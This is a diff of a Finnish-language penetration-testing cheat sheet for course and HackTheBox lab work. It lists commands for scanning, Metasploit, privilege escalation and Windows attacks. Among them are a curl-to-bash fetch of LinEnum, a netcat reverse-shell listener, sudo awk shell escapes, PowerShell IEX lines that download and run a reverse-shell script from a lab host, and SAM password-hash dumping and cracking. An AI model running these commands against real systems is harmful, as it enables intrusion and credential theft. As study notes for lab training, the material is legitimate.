@@ -23,6 +23,7 @@ ls -a			<--->	Listaa myos hidden folderit
 ls -l			<--->	Nayttaa oikeudet
 pwd			<--->	Listaa taman hetkisen hakemiston
 mkdir kansionnimi	<--->	Luo kansion
+mkdir -p /kansio/kansio	<--->	Luo myos ali kansiot
 nano text.txt		<--->	Luo teksti tiedoston
 cd var			<--->	Menee tiettyyn tiedostoon esim cd var menee var kansioon
 cd			<--->	Pelkka cd menee takaisin home kansioon
@@ -44,6 +45,8 @@ ________________________________________________________________________________
 *** HAKUTOIMINTO *** 
 grep nimi		<--->	 Hakee tietueesta hakusanalla
 grep -ir		<--->	 Ir on textin luku ohjelma
+
+alt+.			<--->   viimeisen komennon viimeinen sana
 
 tail tietueennimi -F	<--->	 Avaa tietueen 10viimeista rivia ja -F paivittaa tietoja
 
@@ -434,11 +437,10 @@ shift+a                                         <--->   Intercept tilassa pääs
 
 ________________________________________________________________________________________________________________________________
 ** Gobuster **
-gobuster -u http://URL -w /usr/share/wordlist	<--->	Dir skannaus
+gobuster dir -u http://URL -w /usr/share/wordlist	<--->	Dir skannaus
 
 ________________________________________________________________________________________________________________________________
 ** SEARCHSPLOIT **
-uname -a					<--->	Linux versio komento
 searchsploit "app name"				<--->	Hakee tunnetuja haavoituvuuksia
 searchsploit -w "app name"			<--->	Tuo hakuun web sivun
 searchsploit -x id123.txt			<--->	Hakee lisätietoja IDn mukaan
@@ -478,14 +480,12 @@ ipcalc 10.0.0.0
 
 nmap -n -vvv 10.10.10.1-254 --top-ports 10 | tee portscan.txt
 nmap -n -sV -sC -Pn 10.10.10.10 | tee 10portscan.txt
-nmap -sC -sV -oA localhostscan localhost
+nmap -sC -sV -oA tiedostonnimi 10.10.10.10
 
 -sV                                     <--->   Bannerit eli versiotiedot
-alt+.                                   <--->   viimeisen komennon viimeinen sana
 loppuun -oA nimi                        <--->   Tekee suoraan tiedostot scannauksien tiedoista
 loppuun -sU                             <--->   UDP
 nmap -n 10.10.10.1-254 -p 80,443        <--->   scannaa ip alueen portit 80 ja 443
--sn                                     <--->	
 -Pn                                     <--->   no ping
 --top-ports 10                          <--->   Skanna 10 suosituinta porttia
 -sC					<--->	Scripti skannaus
@@ -508,12 +508,6 @@ msfpc|less --raw
 -R                      <--->   Vaarallinen flagi RHOST asettaa kaikki tiedoston koneet maaliksi
 set                     <--->   Listaa RHOST maalit
 set RHOSTS 10.0.0.0     <--->   Yli ajaa RHOST tiedoston yhdellä maalilla
-
-________________________________________________________________________________________________________________________________
-** EyeWitness **
-eyewitness -f /root/ey/hosts            <--->   EyeWitness toiminto hosts tiedostoon tarvitaan domain tai ip
---web --prepend-https                   <--->   Liput jotka hakee webbisivusta myös https
-hosts                                   <--->   Listataan kansioon hostnimi tai ip
 
 ________________________________________________________________________________________________________________________________
 ** Meterpreter **
@@ -544,8 +538,7 @@ exloit                                          <--->   Lähetää ylennys pyynn
 
 MeterPreter: download /file/path		<--->	Lataa tiedostoja target koneesta
 MeterPreter: upload /file/path			<--->	Lataa tiedostoja target koneelle
-
-Portit pitää avata localkoneesta
+search -f *.hakusana				<--->	Etsii tiedostoja
 
 ________________________________________________________________________________________________________________________________
 ** HashCat **
@@ -570,6 +563,12 @@ systemctl restart ssh                                           <--->   Jos ei t
 hydra http form                                                 <--->   Googlesta löytää web formeihin esimerkkejä
 
 ________________________________________________________________________________________________________________________________
+** EyeWitness **
+eyewitness -f /root/ey/hosts            <--->   EyeWitness toiminto hosts tiedostoon tarvitaan domain tai ip
+--web --prepend-https                   <--->   Liput jotka hakee webbisivusta myös https
+hosts                                   <--->   Listataan kansioon hostnimi tai ip
+
+________________________________________________________________________________________________________________________________
 ** msfvenom **
 msfvenom --list payloads | grep -i linux        <--->   Hakee hyötykuormia
 msfvenom --list formats
@@ -592,10 +591,9 @@ ________________________________________________________________________________
 
 python -m SimpleHTTPServer 8000					<--->   Lataus serveri
 wget 10.10.10.10:8000/filename.php -O /dev/shm/.name.php	<--->   Tiedoston lataus selaimella
-nc -v -n -l -p 5005						<--->	Reverse shell omalle koneelle pentestmonkey php
+nc -vnlp 5005							<--->	Reverse shell pyynto omalle koneelle
 
 python3 -c 'import pty;pty.spawn("/bin/bash")'			<--->	tty shell
-
 CTRL+Z								<--->	Vie taustalle
 stty -a								<--->	Tab mod paalle
 stty raw -echo							<--->	Tab auto comp paalle
@@ -603,25 +601,60 @@ fg								<--->	Ohjelma taustalta takaisin
 stty rows 49							<--->	49 tty riveja
 stty cols 185							<--->	185 tty kolumneja
 
-ps aux | grep root						<--->	root oikeuden ohjelmien haku
-
 ________________________________________________________________________________________________________________________________
 ** LinEnum **
 curl 10.10.10.10/LinEnum/LinEnum.sh | bash			<--->	Python http palvelimelta suoraan portti 80
 SUID								<--->	root kayttajalla ajettavia ohjelmia
 
 ________________________________________________________________________________________________________________________________
-** sudo privesc **
-sudo awk 'BEGIN {system("/bin/sh")}'				<--->	Root user awklla
+** privesc **
+uname -a				<--->   Linux versio komento
+ps aux | grep root			<--->   root oikeuden ohjelmien haku
+sudo -l					<--->	Sudotus oikeudet
+sudo -u user bash			<--->	Sudo toisella kayttajalla
+sudo su					<--->	Super User kirjautuminen
+sudo awk 'BEGIN {system("/bin/sh")}'	<--->	Root user awklla
+find / -perm -4000 2>/dev/null		<--->	Etsii tiedostoja 4000 oikeudella
+openssl passwd -h			<--->	Salasanan luonti passwd tiedostoon helpistä salasana parametrit
+
+________________________________________________________________________________________________________________________________
+** WpScan **
+wpscan --url http://localhost --enumerate u,ap,tt,t | tee teksti.txt	<--->	Scanneri wordpress sivuille
+
+________________________________________________________________________________________________________________________________
+** burpesuite **
+Port:8080			<--->	Proxyyn portti
+CTRL+r				<--->	Intersept lähetetään Repeaterille
+CTRL+u				<--->	URL encoding jos omat komennot ei toimi
+CTRL+SHIFT+u			<--->	URL decode jotta saadaan luettavaan muotoon takaisin
+tcpdump -i tun0			<--->	Takaisin pain pingaukseen
+
+________________________________________________________________________________________________________________________________
+** VIM **
+:q!				<--->	Lopetus
+:w!				<--->	Tallennus
+export TERM=screen		<--->	Jos nuolilla ei voi liikkua vimissa
+
+________________________________________________________________________________________________________________________________
+** WINDOWS **
+exec | c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe					<--->	PS valitseminen
+IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:PORTTI/Invoke-PowerShellTcp.ps1')	<--->	Avaa/lataa
+IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:PORTTI/Sherlock.ps1')			<--->	Sherlock PS
+
+systeminfo					<--->	Powershell komento joka antaa tietoja jarjestelmasta
+/Windows/System32/config/SAM			<--->	Salasana tiedosto windowsille
+pwdump SYSTEM SAM > /kansio/.txt		<--->	Dumpaa salasa hashit luottavaan muotoon
+hashcat -v -m 1000 windowshash rockyou.txt	<--->	SAM hash crackaus
+
+
 
 ________________________________________________________________________________________________________________________________
 
-
-SOURCES
+SOURCES:
 Pohjana Tero Karvinen 2019: Penetration Testing kurssi, http://terokarvinen.com
 Ippsec youtube HackTheBox series, https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
 Priv Escalation from sudo, https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
-
+________________________________________________________________________________________________________________________________
 
 ********************************************************************************************************************************
 ********************************************************************************************************************************
